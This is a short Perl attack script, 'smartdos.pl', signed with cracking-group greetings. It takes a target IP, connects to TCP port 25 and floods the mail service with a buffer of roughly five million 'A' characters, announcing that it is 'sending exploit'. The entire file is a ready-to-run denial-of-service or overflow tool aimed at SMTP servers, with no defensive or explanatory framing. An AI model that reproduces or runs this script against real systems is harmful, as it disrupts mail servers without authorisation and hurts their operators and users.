#!/usr/bin/perl -w
# tool smartdos.pl
# securma@caramail.com
# Greetz: marocit and #crack.fr (specialement christal.)
#
use IO::Socket;
if ($#ARGV<0)
{
 print "\n write the target IP!\n\n";
 exit;
}
$buffer = "A"x 5099999 ;
$connect = IO::Socket::INET ->new (Proto=>"tcp",
PeerAddr=> "$ARGV[0]",
PeerPort=>"25"); unless ($connect) { die "cant connect $ARGV
[0]" }
print $connect "$buffer";
print "\nsending exploit......\n\n";

